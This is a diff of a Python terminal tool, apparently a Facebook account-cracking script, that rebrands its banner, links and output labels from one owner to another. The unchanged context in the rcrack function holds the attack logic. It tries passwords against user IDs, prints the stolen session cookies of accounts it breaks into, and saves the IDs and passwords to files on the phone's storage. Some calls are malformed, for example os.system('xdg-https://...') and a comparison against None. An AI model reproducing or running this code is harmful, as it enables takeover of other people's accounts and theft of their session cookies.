@@ -48,7 +48,7 @@ def FD():
     print(' [2] EXIT')
     opt = input('\n  \x1b[1;32m Choose option >>> ')
     if opt == '1':
-        os.system('xdg-https://www.facebook.com/PiccHi.voice.king.off.ariyan' )
+        os.system('xdg-https://www.facebook.com/PiccHi.voice.king.off.ASIM' )
         o()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -68,7 +68,7 @@ def o():
     if opt == '1':
         i()
     if None == '2':
-        os.system('xdghttps://https://www.facebook.com/PiccHi.voice.king.off.ariyan')
+        os.system('xdghttps://https://www.facebook.com/PiccHi.voice.king.off.ASIM')
         return None
     if None == '3':
         os.system('xdg-https://youtube.com/channel/UCAII3xrWaWIfJgeyRujfDhg ')
@@ -182,24 +182,17 @@ logo =                                          ("""
   / /| | \__ \ / // /|_/ / 
  / ___ |___/ // // /  / /  
 /_/  |_/____/___/_/  /_/   
-                           
-                                      
-                                     
-                                                                    
-                                                                                                                                        
-                                                                            
-\033[1;37m================= \33[32;45mARIYAN\33[0;m =====================
-\033[1;32m     \033[1;33mOwner BY\33[0;m   :  \033[1;33mARIYAN
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m AriyA'n SiN'gg 
-\033[1;32m     \033[1;35mYoutube       :  \033[1;35mAriyan Ahmed Nazmul
+\033[1;37m================= \33[32;45mASIM\33[0;m =====================
+\033[1;32m     \033[1;33mOwner BY\33[0;m   :  \033[1;33mAsim Chakma
+\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Asim Chakma
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
 \033[1;32m     \033[1;35mWHATSAPP       :  \033[1;35mERROR
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
 \033[1;37m================= \33[32;45mMR\33[0;m =====================
  
-       \33[37;41m\t WELLCOME TO ARIYAN TOOLS\33[0;m
+       \33[37;41m\t WELLCOME TO ASIM TOOLS\33[0;m
  
-\033[1;37m================== \33[32;45mARMAN\33[0;m ======================\n""")
+\033[1;37m================== \33[32;45mASIM\33[0;m ======================\n""")
 loop = 0
 oks = []
 cps = []
@@ -349,22 +342,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(ARIYAN-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(ASIM-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/ARIYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/ASIM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(ARIYAN-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/ARIYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('    \33[1;30m(ASIM-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/ASIM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[ARIYAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[ASIM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
